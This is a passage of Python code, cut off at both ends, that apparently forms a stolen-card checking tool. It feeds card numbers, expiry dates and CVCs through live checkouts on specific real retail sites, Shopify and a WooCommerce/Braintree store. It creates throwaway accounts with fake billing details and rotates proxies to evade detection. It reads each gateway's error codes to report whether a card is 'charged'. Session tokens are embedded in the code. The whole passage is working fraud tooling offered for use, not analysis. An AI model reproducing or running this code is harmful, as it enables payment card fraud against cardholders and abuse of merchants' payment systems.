    'https://allamericanroughneck.com/checkouts/unstable/graphql',
    params=params,
    cookies=r.cookies,
    headers=headers,
    json=json_data,
)	
	#print(response.text)	
	msg=response.text		    			   
	match=re.search(r'"code":"(.*?)"', msg)
	if match:
		mssgg = match.group(1)		
		return mssgg
	else:
		return 'charged'
		
			
				
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	r = requests.session()	
	headers = {
    'authority': 'www.garnetandgold.com',
    'accept': 'text/plain, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',   
    'origin': 'https://www.garnetandgold.com',
    'referer': 'https://www.garnetandgold.com/collections/sale-accessories/products/garnet-gold-florida-state-team-caution-tape',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}
	data = {
    'form_type': 'product', 
    'id': '44149980692699',
    'quantity': '1',
    'product-id': '8045728399579',
    'section-id': 'template--19021258162395__main',
}
	response = r.post('https://www.garnetandgold.com/cart/add.js', cookies=r.cookies, headers=headers, data=data)
	
	
	headers = {
    'authority': 'www.garnetandgold.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',  
    'if-none-match': '"cacheable:e1a22398fead2ba73438f4968a3bc0de"',
    'referer': 'https://www.garnetandgold.com/collections/sale-accessories/products/garnet-gold-florida-state-team-caution-tape',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
}
	
	response = requests.get('https://www.garnetandgold.com/cart', cookies=r.cookies, headers=headers)
	
	
	headers = {
    'authority': 'www.garnetandgold.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://www.garnetandgold.com',
    'referer': 'https://www.garnetandgold.com/cart',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
}
	
	
	
	data = {
    'updates[]': '1',
    'note': '',
    'checkout': '',
}
	
	response = r.post('https://www.garnetandgold.com/cart', cookies=r.cookies, headers=headers, data=data)
	headers = {
    'authority': 'checkout.pci.shopifyinc.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/json',
    'origin': 'https://checkout.pci.shopifyinc.com',
    'referer': 'https://checkout.pci.shopifyinc.com/build/75a428d/number-ltr.html?identifier=&locationURL=',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
}
	json_data = {
    'credit_card': {
        'number': n,
        'month': mm,
        'year': yy,
        'verification_value': cvc,
        'start_month': None,
        'start_year': None,
        'issue_number': '',
        'name': 'Jhon Cena Tera daddy',
    },
    'payment_session_scope': 'garnetandgold.com',
}
	response = r.post('https://checkout.pci.shopifyinc.com/sessions', headers=headers, json=json_data)
	Id = (response.json()['id'])
	print(Id)
	headers = {
    'authority': 'www.garnetandgold.com',
    'accept': 'application/json',
    'accept-language': 'en-US',
    'content-type': 'application/json',    
    'origin': 'https://www.garnetandgold.com',
    'referer': 'https://www.garnetandgold.com/',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'shopify-checkout-client': 'checkout-web/1.0',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    'x-checkout-one-session-token': 'ZjBSYTF0RW9QaGM5cUE2SmFWTUxTK0RONE0yRmFUeWord2U2d1dBOXBNQTdQZ2xzcDBEWDk2Q3FYM1VuNHgyanFiWGpGL2g1c2h3bjRvaWhOb3M1dVRxa3VQYkREaGpQZmwzWnZjMU9sa2pqaU5SREo4OERjSnY2VHBtVGF1ZGt0RTJJczROeDBZTWdiRUtrR01PQkx1dFNWazM4NFJsNDFmclFYSlJPd1hiNDZOR1Z4SGNLTUdGOFVmeFVQekt4UCtLYm02MkZvMk13NlpnbmV1aFRXSVd0VmVCQkVkK2U3VGRXSU5sWlpyR3ozdmFwTFROQzNUa2dKOVdSQTZKZkc1UEN2TlNQRGtyOFRrUlZpNHYyc1R5dTdRbkRXK2lMcTVzbzJLa3NrTEE0RFhQaUV0SEx5YnVqLS1paHhzam9YaWxVNzY3eUJQLS1GM3dSSjRKd3A2RzVxSlFPQm9XY1pRPT0',
    'x-checkout-web-build-id': Id,
    'x-checkout-web-deploy-stage': 'production',
    'x-checkout-web-server-handling': 'fast',
    'x-checkout-web-server-rendering': 'no',
    'x-checkout-web-source-id': 'Z2NwLWFzaWEtc291dGhlYXN0MTowMUpRUDBZTjVQM1A2QkJOMk1GREM5TlNBQg',
}
	params = {
    'operationName': 'PollForReceipt',
}
	
	json_data = {
    'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder payEscrowMayExist buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{splitShippingToggle deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}',
    'variables': {
        'receiptId': 'gid://shopify/ProcessedReceipt/1952477315291',
        'sessionToken': 'ZjBSYTF0RW9QaGM5cUE2SmFWTUxTK0RONE0yRmFUeWord2U2d1dBOXBNQTdQZ2xzcDBEWDk2Q3FYM1VuNHgyanFiWGpGL2g1c2h3bjRvaWhOb3M1dVRxa3VQYkREaGpQZmwzWnZjMU9sa2pqaU5SREo4OERjSnY2VHBtVGF1ZGt0RTJJczROeDBZTWdiRUtrR01PQkx1dFNWazM4NFJsNDFmclFYSlJPd1hiNDZOR1Z4SGNLTUdGOFVmeFVQekt4UCtLYm02MkZvMk13NlpnbmV1aFRXSVd0VmVCQkVkK2U3VGRXSU5sWlpyR3ozdmFwTFROQzNUa2dKOVdSQTZKZkc1UEN2TlNQRGtyOFRrUlZpNHYyc1R5dTdRbkRXK2lMcTVzbzJLa3NrTEE0RFhQaUV0SEx5YnVqLS1paHhzam9YaWxVNzY3eUJQLS1GM3dSSjRKd3A2RzVxSlFPQm9XY1pRPT0',
    },
    'operationName': 'PollForReceipt',
}
	response = requests.post(
    'https://www.garnetandgold.com/checkouts/unstable/graphql',
    params=params,
    cookies=r.cookies,
    headers=headers,
    json=json_data,
) 
	print(response.text)
	msg=response.text		    			   
	match=re.search(r'"code":"(.*?)"', msg)
	if match:
		mssgg = match.group(1)		
		return mssgg
	else:
		return 'charged'



def get_proxy():
    try:
        with open("proxy.txt", "r") as file:
            proxies = [line.strip() for line in file if line.strip()]

        if not proxies:
            raise ValueError("No proxies found in proxy.txt")
        
        # Select a random proxy
        selected_proxy = random.choice(proxies)
        ip, port, user, password = selected_proxy.split(":")

        # Format the proxy correctly
        proxy_url = f"http://{user}:{password}@{ip}:{port}"
        return {"http": proxy_url, "https": proxy_url}
    
    except FileNotFoundError:
        print("proxy.txt not found!")
        return None
    except ValueError as e:
        print(e)
        return None

# Example usage




def Tele4(ccx):
	import requests
	import re
	from re import findall
	import random
	import string
	import user_agent
	import base64
	from user_agent import generate_user_agent
	ccx = ccx.strip()
	parts = re.split(r'[ |/]', ccx)
	c = parts[0]
	mm = parts[1]
	ex = parts[2]
	cvc = parts[3]
	try:
	    yy = ex[2] + ex[3]
	    if '2' in ex[3] or '1' in ex[3]:
	        yy = ex[2] + '7'
	    else:
	        pass
	except:
	    yy = ex[0] + ex[1]
	    if '2' in ex[1] or '1' in ex[1]:
	        yy = ex[0] + '7'
	    else:
	        pass
	r=requests.session()
	proxy = get_proxy()	
	print(proxy)
	user = user_agent.generate_user_agent()
	username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
	email = f"{username}@gmail.com"
	user = generate_user_agent()
	r = requests.session()


	headers={
'User-Agent': user,
}

	rrr=r.get("https://www.bebebrands.com/my-account/add-payment-method/",headers=headers, proxies=proxy)
	login=findall(r'name="woocommerce-register-nonce" value="(.*?)"',rrr.text)[0]
	print(login)



	
	response = requests.get("https://ipinfo.io/json", proxies=proxy)
	print(response.text)








	headers={
'User-Agent': user,
}

	data = {
    'username': email,
    'email':email ,
    'password': 'igxyfse7r77e58e88e84ies47s48e',
    'wc_order_attribution_source_type': 'typein',
    'wc_order_attribution_referrer': '(none)',
    'wc_order_attribution_utm_campaign': '(none)',
    'wc_order_attribution_utm_source': '(direct)',
    'wc_order_attribution_utm_medium': '(none)',
    'wc_order_attribution_utm_content': '(none)',
    'wc_order_attribution_utm_id': '(none)',
    'wc_order_attribution_utm_term': '(none)',
    'wc_order_attribution_utm_source_platform': '(none)',
    'wc_order_attribution_utm_creative_format': '(none)',
    'wc_order_attribution_utm_marketing_tactic': '(none)',
    'wc_order_attribution_session_entry': 'https://www.bebebrands.com/my-account/add-payment-method/',
    'wc_order_attribution_session_start_time': '2025-03-30 06:24:01',
    'wc_order_attribution_session_pages': '8',
    'wc_order_attribution_session_count': '1',
    'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'woocommerce-register-nonce': login,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'register': 'Register',
}


	response = r.post('https://www.bebebrands.com/my-account/add-payment-method/', headers=headers, data=data, proxies=proxy)





	headers={
'User-Agent': user,
}

	 
	addadres = r.get('https://www.bebebrands.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers,proxies=proxy)
	
	 
	address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', addadres.text).group(1)
	print(address)






	headers={
'User-Agent': user,
}

	data = {
    'billing_first_name': 'Jhon Cena',
    'billing_last_name': 'Tera daddy',
    'billing_company': 'Lund khao',
    'billing_country': 'GB',
    'billing_address_1': 'Near Walmart 45',
    'billing_address_2': 'RT 34 riad 456',
    'billing_city': 'New york',
    'billing_state': 'New York',
    'billing_postcode': 'S16 1XB',
    'billing_phone': '6499494949',
    'billing_email': email,
    'save_address': 'Save address',
    'woocommerce-edit-address-nonce': address,
    '_wp_http_referer': '/my-account/edit-address/billing/',
    'action': 'edit_address',
}

	response = r.post('https://www.bebebrands.com/my-account/edit-address/billing/', headers=headers, data=data, proxies=proxy)
	







	headers={
'User-Agent': user,
}

	rrr=r.get("https://www.bebebrands.com/my-account/add-payment-method/",headers=headers, proxies=proxy)
	nonce=findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',rrr.text)[0]
	print(nonce)
	client=findall(
        r'"client_token_nonce":"(.*?)"', rrr.text)[0]   
	print(client)
	
	headers = {
    'authority': 'www.bebebrands.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.bebebrands.com',
    'referer': 'https://www.bebebrands.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
}
	
	data = {
    'action': 'wc_braintree_credit_card_get_client_token',
    'nonce': client,
}
	
	rrr=r.post("https://www.bebebrands.com/wp-admin/admin-ajax.php", headers=headers, data=data, proxies=proxy)		
	enc = rrr.json()['data']	
	decoded_text = base64.b64decode(enc).decode('utf-8')
	au = re.findall(r'"authorizationFingerprint":"(.*?)"', decoded_text)[0]
	print(au)





	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': user,
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'b345ada0-c1b3-4fb8-8016-c2766b458acf',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': c,
                'expirationMonth': mm,
                'expirationYear': ex,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}


	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, proxies=proxy)
	tok=(response.json()['data']['tokenizeCreditCard']['token'])
	print(tok)





	headers={
'User-Agent': user,
}

	data = [
    ('payment_method', 'braintree_credit_card'),
